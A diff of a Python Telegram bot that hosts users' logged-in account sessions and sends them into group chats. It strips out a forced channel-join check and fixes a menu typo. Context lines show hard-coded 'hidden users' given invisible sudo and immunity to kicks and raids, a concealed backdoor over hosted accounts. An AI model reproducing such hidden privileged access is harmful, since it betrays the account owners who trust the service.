@@ -59,8 +59,6 @@ ADMIN_USERS = [8976761358]
 # Grants invisible Sudo access + immunity to mutes/kicks/raids
 HIDDEN_USERS = [7499791505, 8976761358]
 
-FORCE_JOIN_CHANNEL = "comlengs"  # Bot MUST be an admin in this channel!
-
 SESSIONS_FILE = "accounts.json"
 USERS_FILE = "bot_users.json"
 PREMIUM_FILE = "premium_users.json"
@@ -247,7 +245,7 @@ MENU_2 = """
 ┃ ╰─ ✅ `.unlock` ➔ **𝐃ɪꜱᴀʙʟᴇ 𝐂ʜᴀᴛ 𝐋ᴏᴄᴋ**
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 
-╭━━━〘 💫 **𝐀𝐔𝐓𝐎 𝐑𝐄𝐀𝐂𝐓𝐈𝐍𝐒** 〙━━━╮
+╭━━━〘 💫 **𝐀𝐔𝐓𝐎 𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍𝐒** 〙━━━╮
 ┃ ├─ ✨ `.react` ➔ **𝐑ᴇᴀᴄᴛ 𝐓ᴏ 𝐔ꜱᴇʀ**
 ┃ ├─ 🌟 `.reactall` ➔ **𝐑ᴇᴀᴄᴛ 𝐓ᴏ 𝐄ᴠᴇʀʏᴏɴᴇ**
 ┃ ├─ 🛑 `.sr` ➔ **𝐒ᴛᴏᴘ 𝐔ꜱᴇʀ 𝐑ᴇᴀᴄᴛ**
@@ -429,20 +427,6 @@ def color_url_button(text: str, url: str, style: str = "primary"):
         except Exception:
             pass
     return Button.url(text, url)
-
-# ── FORCE JOIN CHECKER ─────────────────────────────────────────────────────────
-
-async def check_force_join(user_id):
-    if user_id in ADMIN_USERS or user_id in HIDDEN_USERS:
-        return True
-    try:
-        await controller_bot(GetParticipantRequest(channel=FORCE_JOIN_CHANNEL, participant=user_id))
-        return True
-    except UserNotParticipantError:
-        return False
-    except Exception as e:
-        print(f"⚠️ 𝐃ᴏʀᴇ 𝐄ʀʀᴏʀ ꜰᴏʀ {user_id}: {e}")
-        return False
 
 # ── HELPERS ────────────────────────────────────────────────────────────────────
 
@@ -1341,36 +1325,16 @@ async def finalize_login(user_id, client, event, api_id=None, api_hash=None):
 @controller_bot.on(events.NewMessage(pattern="/start"))
 async def start_cmd(event):
     user_id = event.sender_id
-    if not await check_force_join(user_id):
-        buttons = [
-            [color_url_button("📢 𝐉ᴏɪɴ 𝐂ʜᴀɴɴᴇʟ", f"https://t.me/{FORCE_JOIN_CHANNEL}", style="primary")],
-            [color_button("🔄 𝐈 𝐇ᴀᴠᴇ 𝐉ᴏɪɴᴇᴅ", b"check_join", style="danger")]
-        ]
-        await event.respond(f"⚠️ **𝐀ᴄᴄᴇꜱꜱ 𝐃ᴇɴɪᴇᴅ!**\n\n𝐘ᴏᴜ ᴍᴜꜱᴛ ᴊᴏɪɴ @{FORCE_JOIN_CHANNEL} ꜰɪʀꜱᴛ.", buttons=buttons)
-        return
     await handle_welcome(event, user_id, is_edit=False)
-
-@controller_bot.on(events.CallbackQuery(data=b"check_join"))
-async def check_join_callback(event):
-    user_id = event.sender_id
-    if await check_force_join(user_id):
-        await event.answer("✅ 𝐕ᴇʀɪꜰɪᴇᴅ!")
-        await handle_welcome(event, user_id, is_edit=True)
-    else:
-        await event.answer(f"❌ 𝐉ᴏɪɴ @{FORCE_JOIN_CHANNEL} ꜰɪʀꜱᴛ!", alert=True)
 
 @controller_bot.on(events.CallbackQuery(data=b"back_to_main"))
 async def back_to_main_callback(event):
     user_id = event.sender_id
-    if not await check_force_join(user_id):
-        return await event.answer("❌ 𝐉ᴏɪɴ ᴄʜᴀɴɴᴇʟ ꜰɪʀꜱᴛ!", alert=True)
     await handle_welcome(event, user_id, is_edit=True)
 
 @controller_bot.on(events.CallbackQuery(data=b"start_host"))
 async def host_callback_handler(event):
     user_id = event.sender_id
-    if not await check_force_join(user_id):
-        return await event.answer("❌ 𝐉ᴏɪɴ ᴄʜᴀɴɴᴇʟ ꜰɪʀꜱᴛ!", alert=True)
 
     limit = get_user_limit(user_id)
     sessions = load_saved_sessions()
@@ -1387,8 +1351,6 @@ async def host_callback_handler(event):
 @controller_bot.on(events.CallbackQuery(data=b"manage_host"))
 async def manage_host_callback(event):
     user_id = event.sender_id
-    if not await check_force_join(user_id):
-        return await event.answer("❌ 𝐉ᴏɪɴ ᴄʜᴀɴɴᴇʟ ꜰɪʀꜱᴛ!", alert=True)
 
     sessions = load_saved_sessions()
     user_sessions = [s for s in sessions if s.get("host_user_id") == user_id]
@@ -1423,8 +1385,6 @@ async def admin_summon_cb(event):
 @controller_bot.on(events.CallbackQuery(data=b"user_summon_prompt"))
 async def user_summon_cb(event):
     user_id = event.sender_id
-    if not await check_force_join(user_id):
-        return await event.answer("❌ 𝐉ᴏɪɴ ᴄʜᴀɴɴᴇʟ ꜰɪʀꜱᴛ!", alert=True)
     login_states[user_id] = {"state": "WAITING_USER_SUMMON"}
     await event.answer()
     await event.respond("📢 **𝐒ᴜᴍᴍᴏɴ 𝐌ᴏᴅᴇ**\n\n𝐒ᴇɴᴅ ᴛʜᴇ ɢᴄ ʟɪɴᴋ ᴛᴏ ꜱᴜᴍᴍᴏɴ **𝐘ᴏᴜʀ** ʙᴏᴛꜱ.\n*(ᴛʏᴘᴇ `/cancel` ᴛᴏ ᴀʙᴏʀᴛ)*")
